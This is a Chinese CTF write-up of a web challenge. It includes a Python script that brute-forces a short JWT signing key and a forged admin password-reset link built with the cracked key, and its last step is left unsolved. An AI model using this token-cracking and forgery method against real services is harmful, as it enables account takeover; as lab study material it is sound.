---
title: "Web-2-组合拳！"
published: 2024-11-26
category: CTF
---

![](https://pic.npiter.de/file/1771513389197_20260219230257617.png)

打开发现是登录

![](https://pic.npiter.de/file/1771513392973_20260219230257618.png)

> 尝试admin,密码随便输，无效，没有说用户是否存在，换其他的没用

> [!NOTE]
>
>
> 有注册用户方式，试试看

![](https://pic.npiter.de/file/1771513393080_20260219230257619.png)

**可以注册**

==但是登录显示没有权限，看来要admin==

> [!NOTE]
>
>
> 查看另一个突破口，重置密码试试，拿自己的账号

有重置链接，查资料

![](https://pic.npiter.de/file/1771513403670_20260219230257621.png)

> 查了一下验证码的资料

![](https://pic.npiter.de/file/1771513396345_20260219230257620.png)

哦，尝试扫描网站端口，找到开放的端口

> 使用dirsearch工具

![](https://pic.npiter.de/file/1771513410487_20260219230257622.png)

![](https://pic.npiter.de/file/1771513410195_20260219230257623.png)

暴力解出来，哭不太会

```
from authlib.jose import jwt
from authlib.jose.errors import BadSignatureError
from string import ascii_letters,digits
from itertools import product
from tqdm import tqdm

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiOTA5NzI3NzE1QHFxLmNvbSIsImVtYWlsIjoiOTA5NzI3NzE1QHFxLmNvbSIsInR5cGUiOjN9.Fxhwn5QJl74QAMVcYzLAXdT1tgies-IAWiXGoghWXBA"

# 其实这里走了捷径，可以忽略特殊符号
for i in tqdm(product(list(ascii_letters+digits),repeat=4),desc='attaching...'):
    i = "".join(i)
    try:
        jwt.decode(
            token,
            key=i
        )
        exit(f'key: {i}')
    except BadSignatureError:
        continue;

```

解出![](https://pic.npiter.de/file/1771513415756_20260219230257625.png)

然后反解出admin的重置密码

![](https://pic.npiter.de/file/1771513414471_20260219230257624.png)

> **推出链接来重置密码**
>
>
> http://node6.anna.nssctf.cn:20562/#/reset_token?email=Administrator@163.com&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6IkFkbWluaXN0cmF0b3JAMTYzLmNvbSIsInR5cGUiOjMsImV4cCI6MTczMjYyNjkxOH0.ff-9dF2mQvNTyYpSF0OxZ2dR_iKzvZOugtaIYH7nFQI

![](https://pic.npiter.de/file/1771513420859_20260219230257626.png)

最后进入后台，有个资源下载器，base64的反解得到printf("hello world")，好像没啥用

> [!WARNING]
>
>
> 以下内容不太会

![](https://pic.npiter.de/file/1771513424371_20260219230257627.png)
